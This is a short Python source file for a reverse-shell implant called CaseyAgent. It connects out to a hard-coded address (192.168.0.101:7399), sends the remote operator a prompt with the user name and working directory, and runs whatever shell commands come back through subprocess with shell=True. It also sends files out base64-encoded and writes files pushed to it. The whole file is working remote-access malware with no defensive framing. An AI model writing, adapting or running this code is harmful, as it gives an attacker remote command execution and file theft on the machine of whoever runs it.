import socket
import platform, os, subprocess
import errno
import re
import base64
import struct

class CaseyAgent:
    def __init__(self, ip, port):
        self.soc = socket.socket()
        self.soc.connect((ip, port))


    def send_prompt(self):
        user = os.getlogin()
        cwd = os.getcwd()
        try:
            sys_name = os.uname().sysname
        except AttributeError:
            sys_name = platform.platform()

        prompt = f"({user})-{cwd}> "
        self.soc.send(prompt.encode())


    def exec_cmd(self):
        try:
            cmd = self.soc.recv(4096).decode()
            cmd_chunks = cmd.split(' ')
            if cmd_chunks[0] == "exit" or cmd_chunks[0] == "quit":
                self.soc.close()
                exit()
            elif cmd_chunks[0] == "cd" and len(cmd_chunks) > 1:
                path = re.sub('"|\'', '', cmd[3:])
                os.chdir(path)
                return f"[+] Changing working directory to '{path}'\n"
            elif cmd_chunks[0].lower() == "download" and len(cmd_chunks) > 1:
                path = re.sub('"|\'', '', cmd[9:])
                return self.read_file(path).decode()
            elif cmd_chunks[0].lower() == "upload" and len(cmd_chunks) > 1:
                cmd_chunks = cmd.split(' ')
                file_name = cmd_chunks[1]
                file_size = cmd_chunks[2]
                self.write_file(file_name, file_size)
                return "File uploaded"
            else:
                return subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True).decode()

        except subprocess.CalledProcessError as err:
            result = err.output
            return result.decode()

        except OSError as err:
            if err.errno == errno.ENOENT:
                result = "[!]ERROR: No such file or directory.\n"
                return result
            elif err.errno == errno.EACCES:
                result = "[!]ERROR: Permission denied.\n"
                return result


    def send_cmd_result(self, result):
        result = struct.pack('>I', len(result)) + result.encode()
        self.soc.sendall(result)


    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    
    def write_file(self, file_name, file_size):
        with open(file_name, "wb") as file:
            size = 0
            while size < int(file_size):
                file_content = self.soc.recv(4096)
                file.write(file_content)
                size += len(file_content)


    def run(self):
        while True:
            self.send_prompt()
            cmd_result = self.exec_cmd()
            if cmd_result == "":
                self.send_cmd_result(" ")
            elif cmd_result == "File uploaded":
                self.send_cmd_result("[+] File uploaded successfully\n")
            else:
                self.send_cmd_result(cmd_result)



operation = CaseyAgent("192.168.0.101", 7399)
operation.run()